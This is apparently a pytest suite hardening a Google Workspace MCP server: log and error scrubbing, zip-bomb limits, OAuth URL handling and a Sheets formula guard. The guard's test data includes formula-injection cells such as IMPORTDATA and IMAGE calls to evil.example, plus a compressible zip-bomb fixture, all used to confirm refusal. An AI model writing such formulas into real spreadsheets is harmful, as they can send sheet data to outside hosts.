"""Fourth hardening round: query-string scrubbing, zip-inflation cap, Sheets
formula guard, uvicorn access-log filter, external-URL fallback, trimmed
audit fallback rows, denied-row attribution, and blueprint drift guards."""

from __future__ import annotations

import io
import logging
import sys
import zipfile
from pathlib import Path
from unittest.mock import MagicMock

import pytest
import yaml

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

REPO_ROOT = Path(__file__).resolve().parent.parent
DOCX = "application/vnd.openxmlformats-officedocument.wordprocessingml.document"


class TestRedaction:
    def test_scrub_and_strip(self):
        from core.redaction import scrub_url_queries, strip_query_string

        text = "GET https://gmail.googleapis.com/v1/users/me/messages?q=from%3Aboss+secret&x=1 failed"
        out = scrub_url_queries(text)
        assert "secret" not in out and "?<redacted-query>" in out
        assert (
            strip_query_string("/oauth2callback?code=4/abc&state=xyz")
            == "/oauth2callback"
        )
        assert strip_query_string("/health") == "/health"

    @pytest.mark.asyncio
    async def test_handle_http_errors_scrubs_google_error_text(self, caplog):
        from googleapiclient.errors import HttpError

        from core.utils import handle_http_errors

        resp = MagicMock()
        resp.status = 400
        resp.reason = "Bad Request"
        error = HttpError(
            resp,
            b'{"error": {"message": "Invalid Value"}}',
            uri="https://www.googleapis.com/drive/v3/files?q=name+contains+%27payroll%27",
        )

        @handle_http_errors("search_drive_files", service_type="drive")
        async def tool(**kwargs):
            raise error

        with caplog.at_level("ERROR", logger="core.utils"):
            with pytest.raises(Exception) as excinfo:
                await tool(user_google_email="u@x")
        assert "payroll" not in str(excinfo.value)
        assert "<redacted-query>" in str(excinfo.value)
        assert "payroll" not in caplog.text


def _office_zip(member: str, payload: bytes) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(member, payload)
    return buf.getvalue()


class TestZipInflationCap:
    def test_normal_docx_extracts(self):
        from core.utils import extract_office_xml_text

        xml = (
            b'<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/'
            b'wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Hello world</w:t></w:r>'
            b"</w:p></w:body></w:document>"
        )
        assert "Hello world" in (
            extract_office_xml_text(_office_zip("word/document.xml", xml), DOCX) or ""
        )

    def test_oversized_member_refused(self, monkeypatch, caplog):
        from core import utils

        monkeypatch.setattr(utils, "ZIP_MEMBER_MAX_BYTES", 1024)
        big = b"<w:document>" + b"A" * 5000 + b"</w:document>"
        with caplog.at_level("WARNING", logger="core.utils"):
            assert (
                utils.extract_office_xml_text(
                    _office_zip("word/document.xml", big), DOCX
                )
                is None
            )
        assert "refusing to inflate" in caplog.text

    def test_high_ratio_member_refused(self, monkeypatch, caplog):
        from core import utils

        monkeypatch.setattr(utils, "ZIP_MAX_INFLATION_RATIO", 5)
        bomb = (
            b"<w:document>" + b"\x00" * 200_000 + b"</w:document>"
        )  # compresses ~1000:1
        with caplog.at_level("WARNING", logger="core.utils"):
            assert (
                utils.extract_office_xml_text(
                    _office_zip("word/document.xml", bomb), DOCX
                )
                is None
            )
        assert "inflation ratio" in caplog.text


class TestSheetsFormulaGuard:
    def _tool(self):
        from gsheets import sheets_tools

        fn = sheets_tools.modify_sheet_values
        fn = fn.fn if hasattr(fn, "fn") else fn
        while hasattr(fn, "__wrapped__"):
            fn = fn.__wrapped__
        return fn

    def _service(self):
        service = MagicMock()
        service.spreadsheets.return_value.values.return_value.update.return_value.execute = MagicMock(
            return_value={
                "updatedCells": 1,
                "updatedRange": "Sheet1!A1",
                "updatedRows": 1,
                "updatedColumns": 1,
            }
        )
        return service

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "cell",
        [
            '=IMPORTDATA("https://evil.example/x")',
            '  =IMAGE("https://evil.example/p.png")',
            '+IMPORTXML(A1, "//a")',
            "+ HYPERLINK(A1)",
        ],
    )
    async def test_formula_cells_refused_by_default(self, cell):
        from core.utils import UserInputError

        service = self._service()
        with pytest.raises(UserInputError, match="allow_formulas=True"):
            await self._tool()(
                service, "u@x", spreadsheet_id="S", range_name="A1", values=[[cell]]
            )
        service.spreadsheets.return_value.values.return_value.update.assert_not_called()

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "cell", ["+44 7700 900000", "-5", "hello", "a=b", "Total: =SUM"]
    )
    async def test_ordinary_text_passes(self, cell):
        out = await self._tool()(
            self._service(), "u@x", spreadsheet_id="S", range_name="A1", values=[[cell]]
        )
        assert "Successfully" in out or "updated" in out.lower()

    @pytest.mark.asyncio
    async def test_allow_formulas_or_raw_permits_formulas(self):
        for kwargs in ({"allow_formulas": True}, {"value_input_option": "RAW"}):
            out = await self._tool()(
                self._service(),
                "u@x",
                spreadsheet_id="S",
                range_name="A1",
                values=[["=SUM(A1:A3)"]],
                **kwargs,
            )
            assert out

    @pytest.mark.asyncio
    async def test_json_string_values_are_guarded_too(self):
        from core.utils import UserInputError

        with pytest.raises(UserInputError):
            await self._tool()(
                self._service(),
                "u@x",
                spreadsheet_id="S",
                range_name="A1",
                values='[["=IMPORTDATA(\\"https://evil.example\\")"]]',
            )


class TestUvicornAccessLogFilter:
    def test_query_string_dropped(self):
        from core.log_formatter import QueryStringFilter

        record = logging.LogRecord(
            "uvicorn.access",
            logging.INFO,
            __file__,
            1,
            '%s - "%s %s HTTP/%s" %d',
            ("1.2.3.4:1", "GET", "/oauth2callback?code=4/abc&state=xyz", "1.1", 200),
            None,
        )
        assert QueryStringFilter().filter(record) is True
        assert record.getMessage() == '1.2.3.4:1 - "GET /oauth2callback HTTP/1.1" 200'

    def test_non_matching_record_untouched(self):
        from core.log_formatter import QueryStringFilter

        record = logging.LogRecord(
            "x", logging.INFO, __file__, 1, "plain %s", ("msg",), None
        )
        QueryStringFilter().filter(record)
        assert record.getMessage() == "plain msg"


class TestExternalUrlFallback:
    def test_render_external_url_used_when_workspace_unset(self, monkeypatch):
        from auth.oauth_config import get_external_url

        monkeypatch.delenv("WORKSPACE_EXTERNAL_URL", raising=False)
        monkeypatch.setenv("RENDER_EXTERNAL_URL", "https://otb-mcp.onrender.com/")
        assert get_external_url() == "https://otb-mcp.onrender.com"
        monkeypatch.setenv("WORKSPACE_EXTERNAL_URL", "https://mcp.otbgroup.co.uk")
        assert get_external_url() == "https://mcp.otbgroup.co.uk"
        monkeypatch.delenv("WORKSPACE_EXTERNAL_URL", raising=False)
        monkeypatch.delenv("RENDER_EXTERNAL_URL", raising=False)
        assert get_external_url() is None

    def test_attachment_url_uses_fallback(self, monkeypatch):
        from core.attachment_storage import get_attachment_url

        monkeypatch.delenv("WORKSPACE_EXTERNAL_URL", raising=False)
        monkeypatch.setenv("RENDER_EXTERNAL_URL", "https://otb-mcp.onrender.com")
        assert (
            get_attachment_url("abc") == "https://otb-mcp.onrender.com/attachments/abc"
        )


class TestAuditFallbackRows:
    def test_fallback_row_drops_params_and_error(self):
        from core.audit import _fallback_row

        row = _fallback_row(
            {
                "timestamp_utc": "t",
                "user": "u@x",
                "service": "gmail",
                "tool": "search_gmail_messages",
                "params_summary": '{"query": "<redacted>", "to": "boss@x"}',
                "resource_id": "",
                "status": "error",
                "error": "HttpError: ...secret...",
                "latency_ms": 5,
                "client": "claude-web",
            }
        )
        assert "params_summary" not in row and "error" not in row
        assert row["user"] == "u@x" and row["tool"] == "search_gmail_messages"

    def test_audit_drop_log_line_omits_params(self, monkeypatch, caplog):
        import asyncio

        from core import audit

        monkeypatch.setattr(audit, "ENABLED", True)
        lg = audit.AuditLogger()
        lg.q = asyncio.Queue(maxsize=1)
        lg.submit({"tool": "a", "user": "u@x", "params_summary": "SECRET-A"})
        with caplog.at_level("ERROR", logger="core.audit"):
            lg.submit({"tool": "b", "user": "u@x", "params_summary": "SECRET-B"})
        assert "AUDIT_DROP" in caplog.text and "SECRET-B" not in caplog.text


class TestDeniedRowAttribution:
    def test_unauthenticated_sentinel_and_service(self, monkeypatch):
        from auth import access_policy_middleware as apm
        from core import access_policy as ap
        from core import audit

        fake = MagicMock()
        monkeypatch.setattr(audit, "logger", lambda: fake)
        decision = ap.AccessDecision(
            email=None,
            groups=frozenset(),
            allowed=frozenset(),
            source="unauthenticated",
        )
        apm._audit_denied(
            "search_gmail_messages", decision, 0.0, "no verified identity"
        )
        row = fake.submit.call_args.args[0]
        assert row["user"] == "<unauthenticated>"
        assert row["service"] == "gmail"
        assert apm._service_for("get_my_access") in {"unknown", "core"}


class TestBlueprintDrift:
    def test_render_yaml_matches_live_surface(self):
        blueprint = yaml.safe_load((REPO_ROOT / "render.yaml").read_text())
        env = {e["key"]: e.get("value") for e in blueprint["services"][0]["envVars"]}
        assert "TOOL_TIER" not in env
        assert "gadmin" in env["TOOLS"].split()
        assert "WORKSPACE_EXTERNAL_URL" in env

    def test_dxt_bundle_gone_and_ignored(self):
        assert not (REPO_ROOT / "google_workspace_mcp.dxt").exists()
        gitignore = (REPO_ROOT / ".gitignore").read_text()
        dockerignore = (REPO_ROOT / ".dockerignore").read_text()
        for pattern in ("*.dxt", ".mcpregistry_*"):
            assert pattern in gitignore and pattern in dockerignore

    def test_dockerfile_uses_locked_sync(self):
        assert "uv sync --no-dev --locked" in (REPO_ROOT / "Dockerfile").read_text()


class TestAuthUrlNotLogged:
    @pytest.mark.asyncio
    async def test_start_auth_flow_keeps_url_out_of_log(self, monkeypatch, caplog):
        from auth import google_auth

        monkeypatch.setenv("GOOGLE_OAUTH_CLIENT_ID", "cid.apps.googleusercontent.com")
        monkeypatch.setenv("GOOGLE_OAUTH_CLIENT_SECRET", "GOCSPX-test")
        monkeypatch.setenv("OAUTHLIB_INSECURE_TRANSPORT", "1")
        with caplog.at_level("INFO", logger="auth.google_auth"):
            message = await google_auth.start_auth_flow(
                "u@otbgroup.co.uk",
                "Google Drive",
                "http://localhost:8000/oauth2callback",
            )
        assert "accounts.google.com" in message  # the client still gets the URL
        assert "accounts.google.com" not in caplog.text
